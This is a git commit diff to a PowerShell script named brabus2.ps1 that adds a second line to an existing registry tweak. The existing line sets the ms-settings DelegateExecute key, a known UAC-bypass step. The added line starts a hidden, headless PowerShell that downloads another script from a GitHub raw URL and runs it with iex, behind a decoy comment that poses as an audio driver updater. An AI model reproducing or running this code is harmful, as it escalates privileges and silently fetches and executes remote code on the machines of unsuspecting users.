5cc480d783ccfa28203f9575d705b9b54ff45a7b
waed69 <waedpsn2@gmail.com>
2025-04-26 18:16:25 +0200

    Update brabus2.ps1

--- brabus2.ps1
+++ brabus2.ps1
@@ -1,1 +1,2 @@
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Start-Process conhost.exe -ArgumentList "--headless powershell -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/brabus3.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'`""
